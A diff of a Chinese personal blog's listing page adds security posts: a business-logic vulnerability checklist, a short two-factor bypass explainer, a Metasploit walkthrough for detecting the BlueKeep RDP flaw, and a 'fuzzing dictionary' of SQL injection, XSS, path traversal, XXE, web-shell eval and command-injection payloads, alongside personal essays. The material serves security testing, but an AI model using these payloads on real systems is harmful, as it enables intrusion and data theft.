@@ -97,8 +97,6 @@
         
             <li><a href="%E7%B3%BB%E7%BB%9F.html">系统</a></li>
         
-            <li><a href="%E7%BD%91%E7%BB%9C.html">网络</a></li>
-        
             <li><a href="%E5%BC%80%E5%8F%91.html">开发</a></li>
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
@@ -132,26 +130,81 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15645433648728.html">
+                <a class="clearlink" href="15596178265897.html">
                 
-                  <h1>kali 安装 typora</h1>
+                  <h1>业务逻辑漏洞安全检查checklist</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>第一步
-apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE</p>
+                        	<blockquote>
+<p>整理的部分业务逻辑漏洞 checklist，不打算全部公开。</p>
+</blockquote>
 
-<p>第二步
-add-apt-repository &#39;deb <a href="https://typora.io">https://typora.io</a> linux/&#39;</p>
+<h2 id="toc_0">认证</h2>
 
-<p>第三步
-apt-get install typora</p>
+<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）
+手机验证码（短信轰炸、验证码劫持）
+会话固定
+cookie 伪造/爆破
+使用默认凭证（管理后台、数据库密码）
+冻结账户策略不当
+弱用户名和密码
+“记住我”功能缺陷（前端记住/发送密码）
+自动登录
+单点登录劫持
+第三方登录劫持
+二维码登录劫持
+弱口令
+弱安全问题/答案
+弱的密码恢复机制
+Oauth2.0授权漏洞
+JWT安全
+注册覆盖
+未验证的重定向和转发
+双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）
+恶意注册</p>
 
-<p>如果报错可能是缺依赖，安装依赖即可
-apt-get install libapt-pkg-dev
-apt-get install apt-transport-https
-apt-get update</p>
+<h2 id="toc_1">授权</h2>
+
+<p>测试角色定义（授权不当）
+权限管理缺失（无权限设计）
+匿名访问（备用接口——常见于兼容老的不安全的接口时产生）
+水平越权
+垂直越权
+超级账户
+实名认证不严格</p>
+
+<h2 id="toc_2">会话管理</h2>
+
+<p>cookie安全属性
+cookie可猜解/伪造
+cookie溢出
+会话固定漏洞
+用户凭证不安全传输（弱加密或明文传输）
+用户凭证未一次失效
+用户凭证可猜解
+注销与会话超时
+敏感数据不安全传输（get 方法传输 session）</p>
+
+<h2 id="toc_3">内容安全</h2>
+
+<p>敏感信息过度显示
+违法违规信息</p>
+
+<h2 id="toc_4">设计缺陷</h2>
+
+<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）
+刷赞、刷关注、刷票、刷奖品
+流程绕过（密码找回、支付、登录验证）</p>
+
+<h2 id="toc_5">典型场景</h2>
+
+<p>个人信息
+密码找回/修改
+支付流程
+注册流程
+需要手机/邮箱验证的业务</p>
 
                         
                       </div>
@@ -160,10 +213,10 @@ apt-get update</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/07/31</span>
+                    <span class="date">2019/06/04</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
+          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
           				   
                     
 
@@ -179,207 +232,186 @@ apt-get update</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15645043240972.html">
+                <a class="clearlink" href="15596171974228.html">
                 
-                  <h1>Manjaro安装配置Docker</h1>
+                  <h1>最近做了个 fuzzing 字典精简版</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<h2 id="toc_0">安装 Docker</h2>
+                        	<blockquote>
+<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。
+本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
+</blockquote>
 
-<p>sudo pacman -S docker</p>
-
-<p>启动docker服务
-sudo systemctl start docker </p>
-
-<p>设置docker开机启动服务
-sudo systemctl enable docker</p>
-
-<h2 id="toc_1">干掉 sudo</h2>
-
-<p>如果还没有 docker group 就添加一个
-sudo groupadd docker</p>
-
-<p>将自己的登录名(\({USER} )加入该 group 内。然后退出并重新登录就生效啦
-sudo gpasswd -a \){USER} docker</p>
-
-<p>重启 docker 服务
-sudo systemctl restart docker</p>
-
-<p>切换当前会话到新 group 或者重启 X 会话。注意，这一步是必须的，否则因为 groups 命令获取到的是缓存的组信息，刚添加的组信息未能生效，所以 docker images 执行时同样有错。
-newgrp - docker<br/>
-或者
-pkill X</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/07/31</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15645039971877.html">
-                
-                  <h1>Couldn't connect to Docker daemon at http+docker://localhost - is it running?</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>启动 docker 即可
-sudo systemctl start docker   </p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/07/31</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15644638922385.html">
-                
-                  <h1>firefox总是发送get请求到http://detectportal.firefox.com/success.txt解决办法</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1.在firefox地址栏输入：
-about:config</p>
-
-<p>2.搜索如下内容，并将其设置为false</p>
-
-<p>network.captive-portal-service.enadbled</p>
-
-<p><img src="media/15644638922385/15644639826340.jpg" alt="" style="width:981px;"/></p>
-
-<p>转载于:<a href="https://my.oschina.net/u/1771419/blog/3025419">https://my.oschina.net/u/1771419/blog/3025419</a></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/07/30</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E7%BD%91%E7%BB%9C.html'>网络</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15644581924907.html">
-                
-                  <h1>arch 无法使用 zenmap，报错：'No module named gtk'的解决办法</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>问题截图：
-<img src="media/15644581924907/15644582412797.jpg" alt="" style="width:842px;"/></p>
-
-<p>参考链接：<a href="https://bbs.archlinux.org/viewtopic.php?id=200299">https://bbs.archlinux.org/viewtopic.php?id=200299</a></p>
-
-<p>问题解决办法：安装 pygtk 包
-<img src="media/15644581924907/15644583244261.jpg" alt="" style="width:1366px;"/></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/07/30</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15644488533834.html">
-                
-                  <h1>Manjaro vmware 虚拟机共享宿主机文件夹</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>在客机里运行如下命令可以列出共享目录：
-$ vmware-hgfsclient</p>
-
-<p><img src="media/15644488533834/15644489412501.jpg" alt="" style="width:554px;"/></p>
-
-<p>然后以如下方式挂载：</p>
-
-<pre class="line-numbers"><code class="language-text"># mkdir &lt;shared folders root directory&gt;
-# vmhgfs-fuse -o allow_other -o auto_unmount .host:/&lt;shared_folder&gt; &lt;shared folders root directory&gt;
+<pre class="line-numbers"><code class="language-text">&#39;
+&quot;
+[
+@
+#
+%
+&amp;
+*
+(
+)
+]
+/
+??
+//
+\\
+../
+&lt;!-- 
+%20select @@version
+)%20or%20(&#39;x&#39;=&#39;x
+%20or &#39;a&#39;=&#39;a
+%20or 2 &gt; 1
+%20or &#39;a&#39;=&#39;a
+%20or 1=1
+%20and%201=1
+%20and%201=2
+/**/or/**/1/**/=/**/1
+select &#39;10as&#39;=10;
+exec master..xp_cmdshell &#39;ipconfig+/all&#39;
+%20or &#39;7659&#39;=&#39;7659
+%20or &#39;text&#39; = n&#39;text&#39;
+) union select * from information_schema.tables;
+1+AND+USER_NAME()=’dbo’
+1;waitfor+delay+’0:0:10’
+1’;shutdown –
+as
+%20select 1/*!50000union/*!*//*!50000select/*!*/2;
+%20or 0=0 #&quot;
+&#39; union (select @@version) --
+&#39; union (select NULL, (select @@version)) --
+&#39; union (select NULL, NULL, (select @@version)) --
+&#39; union (select NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+--
+/*
+1’; insert into users values(‘lonelyor’,’lonelyor’)
+%28
+%29
+&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
+&lt;script&gt;alert(8888)&lt;/script&gt;
+&lt;script&gt;confirm(8866)&lt;/script&gt;
+&lt;script&gt;prompt(8877)&lt;/script&gt;
+a&lt;img src=1 onerror=alert(1)&gt;a
+&lt;img src=x onerror=alert(11)&gt;29
+&lt;anytag onmouseover=alert(1)&gt;s
+&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
+&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
+&lt;a onclick=alert(2)&gt;h
+&lt;button/onclick=alert(6)&gt;h
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
+&lt;body/onload=alert(12)&gt;
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+.git
+.gitignore
+.svn
+wp-admin
+wp-login.php
+.DS_store
+.ds_store
+index.php.bak
+.index.php~
+index.php.~
+robots.txt
+.git/config
+admin/
+/admin
+uploads/
+download/
+downloads/
+manager/
+/include
+1.jsp
+hack.jsp
+1.php
+1.asp
+/新建文本文档.txt
+/etc/passwd
+etc/passwd
+../../../../etc/passwd
+/../../../../etc/passwd
+..2f..2fetc2fpasswd
+&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
+&lt;%eval request(chr(35))%&gt;
+&lt;?=eval($_POST[&#39;cmd&#39;]);
+cmd
+system(&quot;ls -al /&quot;)
+%s%s%s%s%s%s%s%s%s%s
+NULL
+null
+zull
+/C:\Program Files\
+C:\Program Files\
+&lt;!--#exec cmd=&quot;ls&quot; --&gt;
+&lt;!--#exec cmd=&quot;dir&quot; --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+| ping -i 30 127.0.0.1 |
+&amp; ping -i 30 127.0.0.1 &amp;
+?url=http://www.zhihu.com/
+?url=https://www.zhihu.com/
+http://www.lonelyor.org/
+https://www.lonelyor.org/
+$ENV{&#39;HOME&#39;}
+2.2250738585072011e-308
+01/01/1979
+*~1*/.aspx
+a*~1*/.aspx
+&lt;h1&gt;haha&lt;/h1&gt;
 </code></pre>
 
-<p>我发现这个方法比较麻烦，而且后续问题比较多。</p>
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/06/04</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
+          				   
+                    
 
-<p>目前使用 smb 文件共享来实现虚拟机与主机共享文件，不依赖虚拟机。</p>
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15595455557551.html">
+                
+                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
+
+<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
+
+<p>现在开始验证：
+1、终端输入<code>msf</code>启动 msf
+2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code>
+3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。
+4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
+
+<p><img src="media/15595455557551/15595462320619.jpg" alt=""/></p>
 
                         
                       </div>
@@ -388,10 +420,151 @@ $ vmware-hgfsclient</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/07/30</span>
+                    <span class="date">2019/06/03</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
+          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
+          				   
+                    
+
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15591786403220.html">
+                
+                  <h1>双因素覆盖不全</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>这篇文章引用自【呆子不开口】在SDCC上的关于账号通行证安全相关的PPT。膜拜大佬</p>
+</blockquote>
+
+<h2 id="toc_0">漏洞原理</h2>
+
+<p>双因素后获取的凭证，在无需双因素处可以获得。</p>
+
+<h2 id="toc_1">常见的场景有：</h2>
+
+<p>1、web版登陆需要双因素认证，但app端却没跟上仍然可以用账号密码登陆
+2、在登陆处需要，在某些特殊功能处却可以通过特殊白名单参数绕过
+3、某些双因素认证后才能获得的凭证，可以在普通权限下通过某接口中获得</p>
+
+<p>案例：</p>
+
+<ul>
+<li>淘宝异地登录短信认证绕过</li>
+<li>某微博的双因素认证绕过</li>
+<li>某app移动端登录获取pc端双因素后的cookie</li>
+</ul>
+
+<h2 id="toc_2">修复方案</h2>
+
+<p>双因素认证后需要额外设置新的凭证
+并保证此凭证不在其他接口输出</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/05/30</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
+          				   
+                    
+
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15591049197350.html">
+                
+                  <h1>今日相思</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>耳机里播放着飞儿的《月牙湾》是谁的爱啊，比泪水坚强。轻声呼唤，就让我融化。每一滴雨水，演化成我翅膀。向着我爱的人，追吧。
+  有些爱没有回声，就像天雨无源落地无根。于是我把无法安置的相思写在了此处，随岁月缓缓蒸发，而远天方那片雪，也随光阴慢慢融化。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/05/29</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html'>风花雪月</a></span>
+          				   
+                    
+
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15590908841596.html">
+                
+                  <h1>学习的深度和广度</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>深度非常重要，学习必需要做到精深至少一门学科或方向。</p>
+
+<p>但是对于精力旺盛和时间充裕的自学者来说，我还是建议广度优先。</p>
+
+<p>这里我想对自学者做个简单的解释，何为自学者？学习本来就是自己的事情，这句话没错，但是很多时候，或者说很多跨行或者零基础开始学习的同学，是没有相关学科或者相关方向的朋友以及交流对象的。所以很多时候，搜集学习资料、确定路线等很容易犯错，并为此付出大量的时间精力。</p>
+
+<p>学无止境，但人的勇气和精力有限。学习是为了自己，但是外因也不该忽视。</p>
+
+<p>因此，我认为初学者应该广度优先，在做深度研究之前，先开阔视野，了解一个领域的相关知识，然后你才知道自己是否喜欢或者是否合适（热爱就是合适、哪怕最后失败你也不会后悔），之后再进行深度学习。这样既能拥有开阔的视野不止于掉进迷茫的漩涡（可以随时纠正自己的方向不止于跑偏——自学者很容易迷失在知识的海洋中），同时理解新东西时能更好的触类旁通。就想运动是想通的一样，知识其实也是想通的。</p>
+
+<p>能做自己热爱的事情是一种幸福，受外力禁锢而做自己不喜欢的事情是很折磨的。如果你的目标不是为了得过且过而是为了改变世界（至少也是改变自己），那么，保持热情，坚持信念吧！</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/05/29</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html'>星火流萤</a></span>
           				   
                     
 
@@ -462,8 +635,6 @@ $ vmware-hgfsclient</p>
         
             <a href="%E7%B3%BB%E7%BB%9F.html"><strong>系统</strong></a>
         
-            <a href="%E7%BD%91%E7%BB%9C.html"><strong>网络</strong></a>
-        
             <a href="%E5%BC%80%E5%8F%91.html"><strong>开发</strong></a>
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
@@ -491,6 +662,12 @@ $ vmware-hgfsclient</p>
 	      
 		      
 			      <li class="post">
+			        <a href="15764947924982.html">Arch系常用技巧与问题汇总</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15747334018156.html">msfvenom各类木马生成脚本</a>
 			      </li>
 		     
@@ -503,19 +680,13 @@ $ vmware-hgfsclient</p>
 		  
 		      
 			      <li class="post">
-			        <a href="15708455642675.html">如何使用cmd开启3389端口与查看3389端口</a>
+			        <a href="15708455642675.html">windows渗透技巧</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15695779467285.html">给linux终端加一个移动到回收站的功能</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15694777838251.html">Proxmox TASK ERROR: Failed to run vncproxy.解决办法</a>
+			        <a href="15692949172295.html">Proxmox物理安装</a>
 			      </li>
 		     
 		  
